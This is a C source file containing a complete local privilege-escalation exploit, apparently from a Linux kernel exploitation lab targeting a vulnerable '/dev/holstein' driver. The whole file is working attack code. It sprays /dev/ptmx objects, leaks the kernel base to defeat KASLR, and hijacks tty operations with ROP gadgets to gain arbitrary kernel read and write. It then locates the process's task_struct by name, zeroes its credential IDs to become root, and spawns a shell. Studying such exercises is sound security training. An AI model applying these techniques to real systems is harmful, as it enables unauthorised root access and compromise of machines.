#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <unistd.h>

#define ofs_tty_ops 0xc38880
#define rop_mov_prdx_rcx (kbase + 0x0477f7)     // mov qword [rdx], rcx; ret;
#define rop_mov_eax_prdx (kbase + 0x18a285)     // mov eax, qword [rdx]; ret;

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int fd;
int spray[100];
char buf[0x500];

void AAW32(unsigned long addr, unsigned int val) {
  unsigned long *p = (unsigned long*)&buf;
  p[12] = rop_mov_prdx_rcx;
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // mov [rdx], rcx; ret;
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
  }
}

// Used to speed up the read-out of memory. It caches the fd that causes the
// rop gadget to be executed, and skips writing the gadget address on
// every new call to AAR32
int cache_fd = -1;

unsigned int AAR32(unsigned long addr) {
  if (cache_fd == -1) {
    unsigned long *p = (unsigned long*)&buf;
    p[12] = rop_mov_eax_prdx;
    *(unsigned long*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);
  }

  // mov eax, [rdx]; ret;
  if (cache_fd == -1) {
    for (int i = 0; i < 100; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, addr /* rdx */);
  }
}

int main() {
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // KASLRの回避
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  // g_buf address leak
  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  // task_structの探索
  if (prctl(PR_SET_NAME, "nekomaru") != 0)
    fatal("prctl");
  unsigned long addr;
  for (addr = g_buf - 0x1000000; ; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("searching... 0x%016lx\n", addr);
  
    if (AAR32(addr) == 0x6f6b656e                  // "oken"
        && AAR32(addr+4) == 0x7572616d) {          // "uram"
      printf("[+] Found 'comm' at 0x%016lx\n", addr);
      break;
    }
  }

  unsigned long addr_cred = 0;
  addr_cred |= AAR32(addr - 8);
  addr_cred |= (unsigned long)AAR32(addr - 4) << 32;
  printf("[+] current->cred = 0x%016lx\n", addr_cred);
  
  // 実効IDの上書き
  for (int i = 1; i < 9; i++) {
    AAW32(addr_cred + i*4, 0); // id=0(root)
  }
  
  puts("[+] pwned!");
  system("/bin/sh");

  return 0;
}
